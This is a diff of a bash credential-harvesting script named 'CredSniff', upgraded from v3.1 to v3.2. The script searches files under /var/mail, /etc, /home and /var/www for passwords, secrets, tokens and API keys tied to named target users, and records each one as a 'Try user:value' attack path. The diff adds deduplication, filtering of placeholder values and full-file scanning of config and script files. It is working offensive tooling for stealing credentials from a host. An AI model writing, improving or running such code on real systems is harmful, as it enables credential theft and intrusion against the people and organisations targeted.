@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================================
-#   CredSniff v3.1 — Credential Harvester
+#   CredSniff v3.2 — Credential Harvester
 #   Target-aware: finds credentials belonging to named users
 #   Usage: ./credsniff.sh -p "charles|sam" [-d /var] [-H]
 # ============================================================================
@@ -11,7 +11,8 @@ M='\033[0;35m'  C='\033[0;36m'  W='\033[1;37m'
 DIM='\033[2m'   RST='\033[0m'
 
 # ── Defaults ──────────────────────────────────────────────────────────────────
-TARGET_DIR_RAW="/var"
+TARGET_DIR_RAW=""
+D_SET=0
 declare -a TARGET_DIRS=()
 declare -a TARGETS=()          # individual terms parsed from -p
 PATTERN=""
@@ -29,10 +30,11 @@ declare -a ALL_CREDS=()
 declare -a ALL_HASHES=()
 declare -a ALL_KEYS=()
 declare -a ATTACK_PATHS=()
+declare -A _CRED_SEEN=()
 
 # ── Credential line regex ─────────────────────────────────────────────────────
 # Matches lines that likely contain a credential value
-CRED_LINE_RE='[Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*\S|[Ss]ecret[[:space:]]*[=:][[:space:]]*\S|[Tt]oken[[:space:]]*[=:][[:space:]]*\S|[Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*\S|[Cc]redential[[:space:]]*[=:][[:space:]]*\S|[Kk]ey[[:space:]]*[=:][[:space:]]*\S'
+CRED_LINE_RE='[Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*\S|[Ss]ecret[[:space:]]*[=:][[:space:]]*\S|[Tt]oken[[:space:]]*[=:][[:space:]]*\S|[Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*\S|[Cc]redential[[:space:]]*[=:][[:space:]]*\S'
 
 # ── Timestamp ─────────────────────────────────────────────────────────────────
 ts() { date +"%H:%M:%S"; }
@@ -78,6 +80,9 @@ rwrite() { [[ -n "$RESULTS_DIR" ]] && echo -e "$2" >> "${RESULTS_DIR}/$1"; }
 cred_hit() {
     local target="$1" value="$2" src="$3" type="${4:-CRED}"
     [[ -z "$value" || "$value" =~ ^[[:space:]]*$ ]] && return
+    local _dk="${target}|${value}"
+    [[ -n "${_CRED_SEEN[$_dk]+x}" ]] && return
+    _CRED_SEEN[$_dk]=1
     FOUND_COUNT=$((FOUND_COUNT + 1))
     ALL_CREDS+=("${target}|${value}|${src}")
     ATTACK_PATHS+=("Try ${target}:${value}")
@@ -109,7 +114,7 @@ banner() {
   \___|_|_\___|___/|___/_|\_|___|_| |_|
 BANNER
     echo -e "${RST}"
-    echo -e "  ${DIM}v3.1${RST} | ${Y}Credential Harvester${RST}"
+    echo -e "  ${DIM}v3.2${RST} | ${Y}Credential Harvester${RST}"
     echo ""
 }
 
@@ -119,8 +124,8 @@ usage() {
     echo "  credsniff.sh -p \"charles|sam\" [options]"
     echo ""
     echo -e "${W}Options:${RST}"
-    echo "  -d DIR        Target directory (default: /var)"
-    echo "                  Use + for multiple: /var/mail+lib+www"
+    echo "  -d DIR        Target directory (default: /var/mail /etc /home /var/www)"
+    echo "                  Use + for multiple: /var/mail+lib+www  or absolute: /var/mail+/etc+/home"
     echo "  -p TARGETS    Target usernames/keywords (pipe-separated)"
     echo "  -w FILE       Load targets from wordlist"
     echo "  -e EXTS       Extension filter (e.g. conf,php,txt)"
@@ -138,7 +143,7 @@ usage() {
 # ── Arg parsing ───────────────────────────────────────────────────────────────
 while getopts "d:p:w:e:Hqh" opt; do
     case $opt in
-        d) TARGET_DIR_RAW="$OPTARG" ;;
+        d) TARGET_DIR_RAW="$OPTARG"; D_SET=1 ;;
         p) PATTERN="$OPTARG" ;;
         w) WORDLIST="$OPTARG" ;;
         e) EXTENSIONS="$OPTARG" ;;
@@ -163,12 +168,21 @@ fi
 # Parse individual targets from pattern
 IFS='|' read -ra TARGETS <<< "$PATTERN"
 
-# ── Expand + syntax ────────────────────────────────────────────────────────────
-if [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
+# ── Expand + syntax or apply smart defaults ────────────────────────────────────
+if [[ $D_SET -eq 0 ]]; then
+    for _sd in /var/mail /etc /home /var/www; do
+        [[ -d "$_sd" ]] && TARGET_DIRS+=("$_sd")
+    done
+    [[ ${#TARGET_DIRS[@]} -eq 0 ]] && TARGET_DIRS=("/var")
+elif [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
     IFS='+' read -ra _parts <<< "$TARGET_DIR_RAW"
     _base=$(dirname "${_parts[0]}")
     for _p in "${_parts[@]}"; do
-        [[ "$_p" == "${_parts[0]}" ]] && TARGET_DIRS+=("$_p") || TARGET_DIRS+=("${_base}/${_p}")
+        if [[ "$_p" == "${_parts[0]}" || "$_p" == /* ]]; then
+            TARGET_DIRS+=("$_p")
+        else
+            TARGET_DIRS+=("${_base}/${_p}")
+        fi
     done
 else
     TARGET_DIRS=("$TARGET_DIR_RAW")
@@ -217,6 +231,9 @@ extract_cred_value() {
 
     # Trim whitespace, quotes
     val=$(echo "$val" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//; s/^["'"'"']//; s/["'"'"']$//')
+    # Discard trivially short or obviously non-secret placeholder values
+    [[ ${#val} -lt 4 ]] && val=""
+    [[ "$val" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty|Bearer|bearer|changeme|CHANGEME|example|EXAMPLE)$ ]] && val=""
     echo "$val"
 }
 
@@ -280,35 +297,68 @@ scan_context() {
     local targets=("$@")
     local ctx=8   # lines of context above/below target mention
 
+    # Full-file scan for small files or structured config/document files —
+    # catches passwords that sit far from the username mention
+    local line_count full_scan=0
+    line_count=$(wc -l < "$file" 2>/dev/null || echo 9999)
+    if [[ $line_count -lt 500 ]] || \
+       [[ "$file" =~ \.(conf|cfg|ini|env|yaml|yml|xml|json|toml|properties|txt|md|php|py|rb|pl|sh)$ ]]; then
+        full_scan=1
+    fi
+
     for target in "${targets[@]}"; do
-        local hit_lines
-        hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
-        [[ -z "$hit_lines" ]] && continue
-
-        while IFS= read -r hit; do
-            local ln="${hit%%:*}"
-            local start=$(( ln - ctx )); [[ $start -lt 1 ]] && start=1
-            local end=$(( ln + ctx ))
-
-            # Extract the context block
-            local block
-            block=$(sed -n "${start},${end}p" "$file" 2>/dev/null)
-
-            # Search context block for credential patterns
-            while IFS= read -r bline; do
-                echo "$bline" | grep -qE "$CRED_LINE_RE" || continue
-                local val; val=$(extract_cred_value "$bline")
-                [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${ln}"
-            done <<< "$block"
-
-            # Also look for inline user:pass on the hit line itself
-            local hitcontent="${hit#*:}"
-            if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
-                local p="${BASH_REMATCH[1]}"
-                [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
-                    cred_hit "$target" "$p" "${file}:${ln}"
+        if [[ $full_scan -eq 1 ]]; then
+            # Scan every credential line in the file; dedup handles repeated hits
+            local cred_lines
+            cred_lines=$(grep -niE "$CRED_LINE_RE" "$file" 2>/dev/null)
+            if [[ -n "$cred_lines" ]]; then
+                while IFS= read -r cline; do
+                    [[ -z "$cline" ]] && continue
+                    local cln="${cline%%:*}" ccontent="${cline#*:}"
+                    local val; val=$(extract_cred_value "$ccontent")
+                    [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${cln}"
+                done <<< "$cred_lines"
             fi
-        done <<< "$hit_lines"
+            # Also look for inline user:pass
+            local hit_lines
+            hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
+            while IFS= read -r hit; do
+                [[ -z "$hit" ]] && continue
+                local ln="${hit%%:*}" hitcontent="${hit#*:}"
+                if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
+                    local p="${BASH_REMATCH[1]}"
+                    [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
+                        cred_hit "$target" "$p" "${file}:${ln}"
+                fi
+            done <<< "$hit_lines"
+        else
+            # Context-window scan for large unstructured files
+            local hit_lines
+            hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
+            [[ -z "$hit_lines" ]] && continue
+
+            while IFS= read -r hit; do
+                local ln="${hit%%:*}"
+                local start=$(( ln - ctx )); [[ $start -lt 1 ]] && start=1
+                local end=$(( ln + ctx ))
+
+                local block
+                block=$(sed -n "${start},${end}p" "$file" 2>/dev/null)
+
+                while IFS= read -r bline; do
+                    echo "$bline" | grep -qE "$CRED_LINE_RE" || continue
+                    local val; val=$(extract_cred_value "$bline")
+                    [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${ln}"
+                done <<< "$block"
+
+                local hitcontent="${hit#*:}"
+                if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
+                    local p="${BASH_REMATCH[1]}"
+                    [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
+                        cred_hit "$target" "$p" "${file}:${ln}"
+                fi
+            done <<< "$hit_lines"
+        fi
     done
 }
 
@@ -371,11 +421,11 @@ scan_keys() {
 # ── Per-file dispatcher ───────────────────────────────────────────────────────
 scan_file() {
     local file="$1"
-    FILES_SCANNED=$((FILES_SCANNED + 1))
-    draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
-
     [[ ! -r "$file" ]] && return
     file "$file" 2>/dev/null | grep -q "text" || return
+
+    FILES_SCANNED=$((FILES_SCANNED + 1))
+    draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
 
     # Which targets appear in this file?
     local matched
